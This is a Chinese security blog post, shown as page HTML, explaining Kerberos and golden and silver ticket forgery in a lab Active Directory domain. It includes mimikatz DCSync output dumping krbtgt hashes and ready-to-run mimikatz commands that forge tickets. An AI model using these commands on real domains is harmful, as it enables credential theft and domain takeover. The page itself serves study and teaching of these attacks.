@@ -1,0 +1,887 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00  前言 在域渗透时，肯定会接触到两个最常见的概念，白银票据和黄金票据，而这两个票据主要是围绕着Kerberos这个认证协议所产生的。 0x01  Kerberos认证 Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并">
+<meta property="og:type" content="article">
+<meta property="og:title" content="白银票据与黄金票据探究">
+<meta property="og:url" content="https://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00  前言 在域渗透时，肯定会接触到两个最常见的概念，白银票据和黄金票据，而这两个票据主要是围绕着Kerberos这个认证协议所产生的。 0x01  Kerberos认证 Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Discussion-on-Silver-Bill-and-Gold-Bill/kerberos_is_rz.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Discussion-on-Silver-Bill-and-Gold-Bill/win2003.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Discussion-on-Silver-Bill-and-Gold-Bill/winxp.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Discussion-on-Silver-Bill-and-Gold-Bill/win2008.png">
+<meta property="article:published_time" content="2019-06-03T15:52:55.000Z">
+<meta property="article:modified_time" content="2019-06-03T15:09:14.000Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="Kerberos认证">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Discussion-on-Silver-Bill-and-Gold-Bill/kerberos_is_rz.png">
+  
+  
+  
+  <title>白银票据与黄金票据探究 - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="白银票据与黄金票据探究"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-06-03 23:52" pubdate>
+          2019年6月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          60 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">白银票据与黄金票据探究</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>0x00  前言</strong></p>
+<p>在域渗透时，肯定会接触到两个最常见的概念，白银票据和黄金票据，而这两个票据主要是围绕着Kerberos这个认证协议所产生的。</p>
+<p><strong>0x01  Kerberos认证</strong></p>
+<p>Kerberos 是一种网络认证协议，其设计目标是通过<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5">密钥</a>系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">主机操作系统</a>的认证，无需基于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E5%9C%B0%E5%9D%80">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8C%85">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF">密码技术</a>（如：共享密钥）执行认证服务的。</p>
+<span id="more"></span>
+<p>整个认证过程需要以下设备：</p>
+<ul>
+<li>客户端（Client）</li>
+<li>服务端（Server）</li>
+<li>认证端（KDC）</li>
+</ul>
+<p>一张图演示下流程：</p>
+<p><img src="http://sh1yan.top/photo/Discussion-on-Silver-Bill-and-Gold-Bill/kerberos_is_rz.png" srcset="/img/loading.gif" lazyload></p>
+<p>如图中显示的，步骤主要分三个来回认证步骤：</p>
+<blockquote>
+<p>K(c,tgs)：session_key(client与tgs之间的通信)</p>
+<p>K(c,s)：session_key(client与server之间的通信)</p>
+</blockquote>
+<p>步骤一：Client  –〉DC（KDC（as））；客户端向认证服务器（AS）发送一个认证请求（KRB_AS_REQ）。</p>
+<p>发送内容① ：[Pre-authentication data（client is ntlm_hash for Timestamp）,Client name &amp; realm（DomainName\Username）,Server Name（KDC TGS NAME）]</p>
+<p>步骤二：DC（KDC（as）） –〉Client ；认证服务器（AS）认证通过后（对比用户名是否在本地数据库中），给客户端发送加密后的Session Key和TGT凭证（KRB_AS_REP）。Session_key &#x3D; K(c,tgs)</p>
+<p>发送内容②：[Client_ntlm_hash(K(c,tgs))],[Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)]</p>
+<p>步骤三：Client –〉DC（KDC（tgs））；客户端拿着自己加密的Session_key和TGT凭证向票据生成服务器（TGS）发起一个认证请求（KRB_TGS_REQ）。</p>
+<p>发送内容③ ：[Session_key(Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）)],[TGT]</p>
+<p>步骤四：DC（KDC（tgs）） –〉Client ；票据生成服务器（TGS）认证通过后，给客户端发送加密后的Session_key和ticket票据（KRB_TGS_REP）。Session_key &#x3D; K(c,s)</p>
+<p>发送内容④ ：k(c,tgs)加密[Session_key],[Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)]</p>
+<p>步骤五：Client –〉Server ；客户端拿着自己加密的Session_key和ticket票据，去访问服务器（无双向认证的话，认证通过后， 即可访问，若双向认证，认证通过后继续走到步骤六）。</p>
+<p>发送内容⑤：K(c,s)加密[Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）],[Tiket]</p>
+<p>步骤六：Server–〉Client ；服务器认证通过后，放行，并且给客户端发送一个加密的Authenticator，用于让客户端识别是否访问正确的服务端。</p>
+<p>发送内容⑥：K(c,s)加密[Authenticator]</p>
+<p><strong>0x02 DC域控和Krbtgt_hash</strong></p>
+<p>kerberos认证服务器称KDC，它是由 Authentication Service 和 Ticket Granting Service 组成，但是它会访问 AD数据库，在认证中会需要到。</p>
+<p>Krbtgt这个账号的密码，储存在域控服务上。下面我们使用Mimikatz对该账号进行密码抓取：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cmd">  .#####.   mimikatz <span class="hljs-number">2</span>.<span class="hljs-number">0</span> alpha (x64) release &quot;Kiwi en C&quot; (Oct <span class="hljs-number">16</span> <span class="hljs-number">2015</span> <span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">00</span>)<br> .## ^ ##.  <br> ## / \ ##  /* * *<br> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br> &#x27;## v ##&#x27;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)<br>  &#x27;#####&#x27;                                     with <span class="hljs-number">17</span> modules * * */<br><br><br>mimikatz(commandline) # privilege::debug<br>Privilege &#x27;<span class="hljs-number">20</span>&#x27; OK<br><br>mimikatz(commandline) # lsadump::dcsync /user:krbtgt<br>[DC] &#x27;shiyan.com&#x27; will be the domain<br>[DC] &#x27;WIN-<span class="hljs-number">2008</span>-DC.shiyan.com&#x27; will be the DC server<br><br>[DC] &#x27;krbtgt&#x27; will be the user account<br><br>Object RDN           : krbtgt<br><br>** SAM ACCOUNT **<br><br>SAM Username         : krbtgt<br>Account <span class="hljs-built_in">Type</span>         : <span class="hljs-number">30000000</span> ( USER_OBJECT )<br>User Account Control : <span class="hljs-number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )<br>Account expiration   : <br>Password last change : <span class="hljs-number">2019</span>/<span class="hljs-number">3</span>/<span class="hljs-number">10</span> <span class="hljs-number">16</span>:<span class="hljs-number">32</span>:<span class="hljs-number">32</span><br>Object Security ID   : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1519369487</span>-<span class="hljs-number">284112811</span>-<span class="hljs-number">2415659819</span>-<span class="hljs-number">502</span><br>Object Relative ID   : <span class="hljs-number">502</span><br><span class="hljs-function"></span><br><span class="hljs-function">Credentials:</span><br><span class="hljs-function">  <span class="hljs-title">Hash</span> <span class="hljs-title">NTLM</span>: <span class="hljs-title">f485a96fccc63f78ad5d97c1a9e7ccdc</span></span><br><span class="hljs-function">    <span class="hljs-title">ntlm</span>- 0: <span class="hljs-title">f485a96fccc63f78ad5d97c1a9e7ccdc</span></span><br><span class="hljs-function">    <span class="hljs-title">lm</span>  - 0: 86092<span class="hljs-title">d17337fdadc0c1464e8d80d83df</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Supplemental</span> <span class="hljs-title">Credentials</span>:</span><br><span class="hljs-function">* <span class="hljs-title">Primary:Kerberos</span>-<span class="hljs-title">Newer</span>-<span class="hljs-title">Keys</span> *</span><br><span class="hljs-function">    <span class="hljs-title">Default</span> <span class="hljs-title">Salt</span> : <span class="hljs-title">SHIYAN.COMkrbtgt</span></span><br><span class="hljs-function">    <span class="hljs-title">Default</span> <span class="hljs-title">Iterations</span> : 4096</span><br><span class="hljs-function">    <span class="hljs-title">Credentials</span></span><br><span class="hljs-function">      <span class="hljs-title">aes256_hmac</span>       (4096) : <span class="hljs-title">fb147173be1b6a2a8eac268939dd69c32fb171de20efcb54906a36258b636073</span></span><br><span class="hljs-function">      <span class="hljs-title">aes128_hmac</span>       (4096) : <span class="hljs-title">b59eb41b15584131568980b934145fc1</span></span><br><span class="hljs-function">      <span class="hljs-title">des_cbc_md5</span>       (4096) : 5<span class="hljs-title">b522994989e014f</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">* <span class="hljs-title">Primary:Kerberos</span> *</span><br><span class="hljs-function">    <span class="hljs-title">Default</span> <span class="hljs-title">Salt</span> : <span class="hljs-title">SHIYAN.COMkrbtgt</span></span><br><span class="hljs-function">    <span class="hljs-title">Credentials</span></span><br><span class="hljs-function">      <span class="hljs-title">des_cbc_md5</span>       : 5<span class="hljs-title">b522994989e014f</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">* <span class="hljs-title">Packages</span> *</span><br><span class="hljs-function">    <span class="hljs-title">Kerberos</span>-<span class="hljs-title">Newer</span>-<span class="hljs-title">Keys</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">* <span class="hljs-title">Primary:WDigest</span> *</span><br><span class="hljs-function">    01  <span class="hljs-title">e23885a89ebfaf81a83a9958af90347c</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">mimikatz</span>(<span class="hljs-title">commandline</span>) # <span class="hljs-title">exit</span></span><br><span class="hljs-function"><span class="hljs-title">Bye</span>!</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>0x03 黄金票据</strong></p>
+<p>黄金票据主要是发生在kerberos的第三和第四步骤上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 第二步骤，AS发给客户端的数据。</span><br>[Client_ntlm_hash(K(c,tgs))],[Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)]<br></code></pre></td></tr></table></figure>
+
+<p>在第三步骤时，客户端拥有两个数据，一个是自己账号ntlm_hash加密的session_key、一个是TGT凭证，而这个TGT凭证是kertgt的ntlm_hash加密的信息。</p>
+<p>而当我们知道kertgt的ntlm_hash时，我们是不是就可以伪造TGT凭证，发送给票据生成服务器（TGS）？</p>
+<p>如第三步骤中需要发送的内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[Session_key(Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）)],[TGT（Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)）]<br></code></pre></td></tr></table></figure>
+
+<p>这样，我们就可以访问域内任意一台服务器</p>
+<p><strong>伪造方法：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot;</span> exit<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:shiyan.com /sid:S-1-5-21-1519369487-284112811-2415659819 /rc4:f485a96fccc63f78ad5d97c1a9e7ccdc /user:administrator /ptt&quot;</span> exit<br></code></pre></td></tr></table></figure>
+
+<p><strong>在网上还找见一个方法：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">mimikatz<span class="hljs-comment"># kerberos::gloden /domain:shiyan.com /sid:S-1-5-21-1519369487-284112811-2415659819 /krbtgt:f485a96fccc63f78ad5d97c1a9e7ccdc /user:Administrator /ticket:test.kribi</span><br><br><span class="hljs-keyword">or</span><br><br>mimikatz<span class="hljs-comment"># kerberos::gloden /domain:shiyan.com /sid:S-1-5-21-1519369487-284112811-2415659819 /aes256:fb147173be1b6a2a8eac268939dd69c32fb171de20efcb54906a36258b636073 /user:Administrator /ticket:test.kribi</span><br></code></pre></td></tr></table></figure>
+
+<p>然后再导入这个test.kribi文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">mimikatz::ptt test.kribi<br></code></pre></td></tr></table></figure>
+
+<p>然后即可访问其它域成员默认共享目录。</p>
+<p><strong>0x04 白银票据</strong></p>
+<p>白银票据主要是发生在第五步骤上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">k(c,tgs)加密[Session_key],[Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)]<br></code></pre></td></tr></table></figure>
+
+<p>在第四步骤时，票据生成服务器（TGS）给我们发了上面的数据，在第五步骤时，我们需要发送下面的数据。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">K(c,s)加密[Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）],[Tiket（Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)）]<br></code></pre></td></tr></table></figure>
+
+<p>从需要发送的数据上看，只要我们有了server_ntlm_hash，我们就可以伪造Tiket的，这个也就是白银票据。</p>
+<p><strong>伪造方法：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot;</span> exit<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">kerberos::golden /admin:administrator@SHIYAN.COM /domain:SHIYAN.COM /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3794943108</span>-<span class="hljs-number">2167292304</span>-<span class="hljs-number">869428770</span>-<span class="hljs-number">500</span> /target:win-<span class="hljs-number">2003.</span>shiyan.com/rc4:3daa81d4a957bbd06f94f5ee1bbcff33 /service:cifs /ptt<br></code></pre></td></tr></table></figure>
+
+<p>可以伪造的服务：</p>
+<table>
+<thead>
+<tr>
+<th>服务类型</th>
+<th>服务名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>HOST、RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell Remoting</td>
+<td>HOST、HTTP</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST、HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP operations including</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Mimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS、LDAP、CIFS</td>
+</tr>
+</tbody></table>
+<p><strong>0x05  白银票据与黄金票据的不同点</strong></p>
+<ol>
+<li>访问权限不同</li>
+</ol>
+<p>Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限<br>Silver Ticket: 伪造 TGS,只能访问指定的服务</p>
+<ol start="2">
+<li>加密方式不同</li>
+</ol>
+<p>Golden Ticket 由 Kerberos 的 Hash 加密<br>Silver Ticket 由服务账号(通常为计算机账户)Hash 加密</p>
+<ol start="3">
+<li>认证流程不同</li>
+</ol>
+<p>Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要</p>
+<p><strong>0x06 心酸的复现篇</strong></p>
+<p>域控：win2008，192.168.3.118</p>
+<p>域成员1：win2003,192.168.3.119</p>
+<p>域成员2：winxp，192.168.3.138</p>
+<p>域成员3：win2012，192.168.3.129</p>
+<p>伪域成员：win7，192.168.3.156</p>
+<p><strong>复现开始！</strong></p>
+<p>win2003  —白银票据—〉winxp  ，报错_无法伪造</p>
+<p>ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMe ssage : c000000d</p>
+<p>win2003  —白银票据—〉win2012  ，报错_无法伪造</p>
+<p>ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMe ssage : c000000d</p>
+<p>winxp  —白银票据—〉win2003，成功_无法利用 </p>
+<p>Golden ticket for ‘<a href="mailto:&#97;&#x64;&#109;&#x69;&#x6e;&#x69;&#115;&#116;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#115;&#x68;&#105;&#x79;&#97;&#x6e;&#x2e;&#x63;&#111;&#109;">&#97;&#x64;&#109;&#x69;&#x6e;&#x69;&#115;&#116;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#115;&#x68;&#105;&#x79;&#97;&#x6e;&#x2e;&#x63;&#111;&#109;</a>‘ successfully submitted for current session</p>
+<p>\\win2003.shiyan.com\C$</p>
+<p>弹出登录框。。。。。</p>
+<p>换目标。。。。</p>
+<p>————————————–优雅的分割线————————————-</p>
+<p>启动  win7，打开我的电脑，鼠标右键，修改计算机名称，加入域 shiyan.com ，彭！报错！</p>
+<p>无法与域“shiyan.com”的Actice Directory域控制器（AD DC）连接。</p>
+<p>继续各种百度配置中。。。</p>
+<p>无法与域“shiyan.com”的Actice Directory域控制器（AD DC）连接。</p>
+<p>好吧， 我放弃了！！！</p>
+<p>————————————–优雅的分割线————————————-</p>
+<p>win2012  —白银票据—〉winxp，成功_无法利用 </p>
+<p>Golden ticket for ‘<a href="mailto:&#97;&#x64;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#x73;&#104;&#x69;&#121;&#97;&#110;&#x2e;&#x63;&#x6f;&#109;">&#97;&#x64;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#x73;&#104;&#x69;&#121;&#97;&#110;&#x2e;&#x63;&#x6f;&#109;</a>‘ successfully submitted for current session</p>
+<p>\\winxp.shiyan.com\C$</p>
+<p>弹出登录框。。。。。</p>
+<p>各种瞎几把调试本地安全策略。。。。</p>
+<p>然后巨坑的一步来了！！！没错，巨坑的一步来了。。。</p>
+<p><img src="http://sh1yan.top/photo/Discussion-on-Silver-Bill-and-Gold-Bill/win2003.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Discussion-on-Silver-Bill-and-Gold-Bill/winxp.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Discussion-on-Silver-Bill-and-Gold-Bill/win2008.png" srcset="/img/loading.gif" lazyload></p>
